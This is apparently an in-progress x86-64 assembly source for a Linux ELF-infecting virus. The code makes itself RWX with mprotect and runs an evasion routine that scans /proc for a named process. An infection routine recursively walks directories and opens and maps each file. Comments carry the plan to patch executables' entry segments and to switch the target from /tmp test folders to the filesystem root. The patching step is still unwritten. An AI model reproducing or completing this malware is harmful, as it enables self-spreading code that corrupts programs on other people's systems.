%include "main.inc"

; function parameters are always (rdi, rsi, rdx, rcx, r8, r9) in this specific
; order (make sense with syscall)

global _start

; ------------------------ this section exists for packer to work ; to find after excecute segment offset ----------------
section .packer_sec
    db `haha`, 0

section .text

params:                                ; filled for infected binaries
    test_param dq 0x0

_start:

main:
    ; mprotect start to end labels to be RWX
    mov rax, SYS_MPROTECT
    lea rdi, [rel _start]
    lea rsi, [rel _end]
    sub rsi, rdi
    mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
    syscall

	; branch for infected file running or running patient 0
    cmp qword [test_param], 0
    je mother

infected:
    ; TODO: if run as infected, run the same routine as mother
    ; but modify evasion routine and jump to entry address afterward
    jmp exit_ok

mother:

	; evasion routine
    call evasion_routine
    
    test rax, rax
    jz exit_ok

    ; infection routine
    lea rdi, [rel root_dirs]
    call infection_routine
    jmp exit_err

    ; lea r8, [rel _end] ; end addr
    ; lea r9, [rel _start]; start addr
    ; sub r8, r9 ; r8 = end - start
    

; evasion routine, this is run to detect if certain
; processes are running by scanning the /proc/ directory
; returns 0 if evasion is requried
evasion_routine:
    push rbx
    push rcx
    push r8
    push r9
    push r10

    mov rax, SYS_OPEN
    lea rdi, [rel proc_dir]
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall

    ; save this fd
    mov r9, rax

    test rax, rax
    js exit_err

.file_loop_start_evasion:
    sub rsp, DIRENT_BUF_SZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, DIRENT_BUF_SZ
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js exit_err
    jz .file_loop_end_evasion
    
    mov rcx, 0

.dirent_read_loop_start_evasion: 
    cmp rcx, rax
    jge .dirent_read_loop_end_evasion

    mov rbx, rsp ; og stack w/ dirent is now at rbx
	push rax

    ; allocate /proc/[dirent.d_name]/status in stack
    ; open and read. If error, continue
    sub rsp, SIX_SEVEN

    lea rsi, [rel proc_dir]
    mov rdi, rsp
    mov rdx, 6
    call memcpy

    ; rax contains addr already
    lea rsi, [rbx + rcx + dirent.d_name]
    mov rdi, rax
    call strcpy

    lea rsi, [rel proc_status]
    mov rdi, rax
    mov rdx, 8
    call memcpy

    ; ; print stuff
    ; lea rdi, [rsp]
    ; call write_string_nl

    ; open 
    mov rax, SYS_OPEN
    lea rdi, [rsp]
    mov rsi, O_RDONLY
    xor rdx, rdx
    push rcx
    syscall
    pop rcx
    
    ; save fd to r10 for close later
    mov r10, rax

    ; jmp to dirent_read_loop_start_evasion_end if err
    test rax, rax
    js .dirent_read_loop_start_evasion_end 

    ; consume file name 
    ; read first SIX_SEVEN bytes
	sub rsp, SIX_SEVEN
    mov rdi, rax
    lea rsi, [rsp]
    mov rdx, SIX_SEVEN - 1
    mov rax, SYS_READ
    push rcx
    syscall
    pop rcx
    mov byte [rsp + rax], 0

	; close the original fd
    mov rdi, r10
    mov rax, SYS_CLOSE
    push rcx
    syscall
    pop rcx

    ; strstr
	lea rdi, [rsp]
    lea rsi, [rel evade_proc]
    push r8
    push r9
    call strstr
    pop r9
    pop r8
    add rsp, SIX_SEVEN
    test eax, eax
    jz .dirent_read_loop_start_evasion_end
    add rsp, SIX_SEVEN + DIRENT_BUF_SZ + 8 ; push rax from earlier
    mov rax, 0
    jmp .ret


.dirent_read_loop_start_evasion_end:
    add rsp, SIX_SEVEN
    pop rax

.dirent_read_loop_cont_evasion:
    movzx r8, word [rsp + rcx + dirent.d_reclen]
    add rcx, r8
    jmp .dirent_read_loop_start_evasion
    
.dirent_read_loop_end_evasion: 
    add rsp, DIRENT_BUF_SZ
    jmp .file_loop_start_evasion


.file_loop_end_evasion:
    push rax
    mov rdi, r9
    mov rax, SYS_CLOSE
    syscall
    pop rax
    add rsp, DIRENT_BUF_SZ

mov rax, 1
.ret:
    pop r10
    pop r9
    pop r8
    pop rcx
    pop rbx
    ret

; input, rdi - a list of root directories
infection_routine:
    push rbx
    push rcx
    push r9
    push r8

; iterate through root folders
.roots_iter:
    mov r8, rdi

    ; for each folder, iterate through all the entities
    mov rax, SYS_OPEN
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall

    ; save this fd
    mov r9, rax

    test rax, rax
    js .ret

    ; call write_string_nl

.file_loop_start_infection:
    sub rsp, DIRENT_BUF_SZ
    mov rdi, r9
    mov rsi, rsp
    mov rdx, DIRENT_BUF_SZ
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js exit_err
    jz .file_loop_end_infection

    mov rcx, 0

.dirent_read_loop_start_infection:
    cmp rcx, rax
    jge .dirent_read_loop_end_infection

    mov rbx, rsp ; og stack w/ dirent is now at rbx
	push rax

	mov rdi, r8
    call strlen

    sub rsp, BLAZEIT
    ; zero out the bytes from rsp here
    push rcx
    xor ecx, ecx
.zloop:
    mov byte [rsp + 8 + rcx], 0   ; +8 skips the saved rcx
    inc ecx
    cmp ecx, BLAZEIT
    jb .zloop
    pop rcx


    mov rsi, r8
    mov rdi, rsp
    mov rdx, rax
    call memcpy

	mov rdi, rax
    lea rsi, [rel slash]
    mov rdx, 1
    call memcpy

    lea rsi, [rbx + rcx + dirent.d_name]
    mov rdi, rax
    call strcpy

	; NOTE: /bin is symlink to /usr/bin
    ; check if dirent.d_name is bad (./ and ../)
    lea rdi, [rbx + rcx + dirent.d_name]
    lea rsi, [rel excl_dir]
    call strstrs
    test rax, rax
    jnz .dirent_read_loop_start_infection_end

    ; check dirent.d_type. If DT_DIR, recurse infection_routine with the name as input
    ; if DT_REG, run infection on singele file 
    mov ah, [rbx + rcx + dirent.d_type]
    cmp ah, DT_DIR
    jne .skip_recurse
    lea rdi, [rsp]
    call infection_routine


.skip_recurse:


    ; print stuff
    lea rdi, [rsp]
    call write_string_nl
    push rcx
    call infect_single_file
    pop rcx


.dirent_read_loop_start_infection_end:
    add rsp, BLAZEIT
    pop rax

.dirent_read_loop_cont_infection:
    movzx rdi, word [rsp + rcx + dirent.d_reclen]
    add rcx, rdi
    jmp .dirent_read_loop_start_infection

.dirent_read_loop_end_infection: 
    add rsp, DIRENT_BUF_SZ
    jmp .file_loop_start_infection

.file_loop_end_infection:
	push rax
    mov rdi, r9
    mov rax, SYS_CLOSE
    syscall
    pop rax
    add rsp, DIRENT_BUF_SZ

    
    mov rdi, r8
    call strlen
    inc rax
    add rdi, rax
    call strlen
    test rax, rax
    jz .roots_iter_end
    jmp .roots_iter

.roots_iter_end:

    

.ret:
    pop r8
	pop r9
    pop rcx
    pop rbx
    ret

infect_single_file:
    push r8 ; fd to r8
    push r9 ; mmap buf to r9
    push r10

    mov rax, SYS_OPEN
    mov rsi, O_RDONLY
    syscall ; read

    test rax, rax
    js .ret

    ; fd to r8
    mov r8, rax

    ; get file size via lseek
    mov rdi, rax
    mov rsi, 0
    mov rdx, SEEK_END
    mov rax, SYS_LSEEK
    syscall

    test rax, rax
    js .close

    ; if file size < THEO_MIN_SIZE bytes, this couldnt possibly be a program 
    cmp rax, THEO_MIN_SIZE
    jle .close


	; addr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // NOTE: need to free this using munmap
    ; (rdi, rsi, rdx, rcx, r8, r9)
    ; mmap file contents to buffer
    mov rdi, 0
    mov rsi, rax
    mov rdx, PROT_READ
    mov r10, MAP_PRIVATE
    mov r8, r8 ; fd is already in r8
    mov r9, 0
    mov rax, SYS_MMAP
    syscall

    ; rax should have the mmap address and contents....
    call break

    
    ; from file contents, check if its elf64.
    ; if its not elf64, close and munmap and return

    
    ; get the entry point (vaddr)

    ; iterate the program header, see which segment is the entry point (usually is load segment with RX)
    ; calculate entry point offset (entry vaddr - pheader.vaddr)

    ; go to entry point offset in buffer, check if infected (TODO: calculate offset later)
    ; if infected, close and munmap and return

    ; if not infected, close and munmap

    ; ftruncate to add 0x1000 (4096) bytes (hardcoded offset here)
    ; mmap the file with new size here

    ; do the actual patching (TBD)

    ; check next program header (segment) comes next, and calulate space avail ((pheader_nxt.offset) - (pheader_curr.offset + size))
    ; if smaller than _end - _start, (WAIT NO)

    ; jmp exit_ok


.close:
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall
    jmp .ret

.munmap:
    jmp .ret

.ret:
	pop r10
    pop r9
    pop r8
    ret


error_exit:
    mov rdi, 1                          ; exit code 1
    mov rax, SYS_EXIT                   ; exit
    syscall

; -----------------------------------utils--------------------------------
exit_err:
    mov rdi, 1                          ; exit code 1
    mov rax, SYS_EXIT                   ; exit
    syscall

exit_ok:
    mov rdi, 0                          ; exit code 0
    mov rax, SYS_EXIT                   ; exit
    syscall

strlen:
    xor rax, rax

.loop:
    cmp byte[rdi + rax], 0
    je .done

    inc rax
    jmp .loop

.done:
    ret

write_string_nl:
    push rdi
    push rax
    push rcx

    call strlen ; rax = string length

    ; write(fd=stdout, buf=string, count=len)
    mov rdx, rax
    mov rax, SYS_WRITE
    mov rsi, rdi
    mov rdi, 1
    syscall

    ; write newline
    mov rax, SYS_WRITE
    mov rdi, 1
    lea rsi, [rel newline]
    mov rdx, 1
    syscall

	pop rcx
    pop rax
    pop rdi
    ret

memcpy:
    push rcx
    mov rcx, rdx
    rep movsb
    mov rax, rdi
    pop rcx
    ret

strcpy:
    push    rcx
    mov     rax, rdi

.loop:
    mov     cl, [rsi]
    mov     [rdi], cl
    inc     rsi
    inc     rdi
    test    cl, cl
    jnz     .loop

    mov     rax, rdi
    dec     rax
    pop     rcx
    ret

strstr:
    cmp     byte [rsi], 0
    je      .found

.outer:
    mov     r8, rdi
    mov     r9, rsi

.inner:
    mov     al, [r9]
    cmp     al, [r8]
    jne     .next
    inc     r9
    inc     r8
    cmp     byte [r9], 0
    jne     .inner

.found:
    mov     eax, 1
    ret

.next:
    inc     rdi
    cmp     byte [rdi], 0
    jne     .outer

    xor     eax, eax
    ret

; rdi - str
; rsi - list of strs
; return 1 if found
; return 0 if not found

strstrs:
    push rbx
    mov  rbx, rdi            ; save str

.next:
    cmp  byte [rsi], 0
    je   .not_found          ; double NULL = end of list

    mov  rdi, rsi            ; candidate string
    mov  rdx, rbx            ; str

.compare:
    mov  al, [rdi]
    cmp  al, [rdx]
    jne  .next_str

    test al, al
    jz   .found

    inc  rdi
    inc  rdx
    jmp  .compare

.next_str:
    ; Skip to the next string
    inc  rsi
    cmp  byte [rsi - 1], 0
    jne  .next_str
    jmp  .next

.found:
    mov  eax, 1
    pop  rbx
    ret

.not_found:
    xor  eax, eax
    pop  rbx
    ret

memcmp:
    xor eax, eax
    test rdx, rdx
    jz .done

.loop:
    movzx eax, byte [rdi]
    movzx ecx, byte [rsi]
    sub eax, ecx
    jnz .done

    inc rdi
    inc rsi
    dec rdx
    jnz .loop

.done:
    ret

break:
    ret
; -----------------------------------data-in-code-------------------------------

dirent_buf times DIRENT_BUF_SZ db 0x0
elf64_signature db 0x7F, 'E', 'L', 'F', 2

newline db `\n`
slash db `/`
null db 0

; TODO: change this to root 
root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
; root_dirs db `/`,0,0

excl_dir db `.`, 0, `..`, 0, 0
; excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, `dev`, 0, `lost+found`, 0, `media`, 0, `mnt`, 0, `opt`, 0, `proc`, 0, `boot`, 0, `run`, 0, `var`, 0, 0





proc_dir db `/proc/`,0
proc_status db `/status`, 0
evade_proc db `\tcat\n`, 0

_end:
